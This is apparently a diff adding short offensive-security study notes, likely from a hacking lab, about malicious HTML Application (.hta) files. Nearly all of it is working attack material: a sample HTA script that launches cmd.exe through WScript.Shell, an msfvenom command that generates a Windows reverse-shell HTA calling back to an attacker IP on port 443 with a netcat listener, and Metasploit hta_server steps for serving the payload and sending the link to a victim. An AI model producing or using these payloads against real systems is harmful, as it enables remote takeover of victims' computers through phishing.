@@ -1,0 +1,27 @@
+HTA = HTML Application
+
+Example of a malicious file.hta :
+        <html>
+                <body>
+                        <script>
+                        	var c= 'cmd.exe'
+                        	new ActiveXObject('WScript.Shell').Run(c);
+                        </script>
+                </body>
+        </html>
+
+
+HTA Reverse Connection :
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+        ==> then deliver it to the victim to execute it ( having a nc on 443 )
+        
+        OR
+
+        MSF :
+                use exploit/windows/misc/hta_server
+                set LHOST, LPORT, SRVHOST
+                exploit
+                deliver the link provided 
+        
+
+---------------------------------------------------------------------------------------------------------------------------------------
